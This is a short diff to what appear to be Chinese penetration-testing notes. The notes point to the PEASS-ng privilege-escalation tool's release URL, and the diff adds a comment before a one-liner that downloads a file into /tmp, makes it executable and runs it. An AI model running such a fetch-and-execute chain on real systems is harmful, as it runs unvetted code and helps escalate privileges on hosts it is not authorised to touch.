@@ -1,2 +1,3 @@
 amd64-官方地址：https://github.com/peass-ng/PEASS-ng/releases/download/20260315-d7c1e6ce/
+>wget下载到tmp目录在执行
 cd /tmp && wget $downloadurl && chmod +x $badfile && ./$badfile
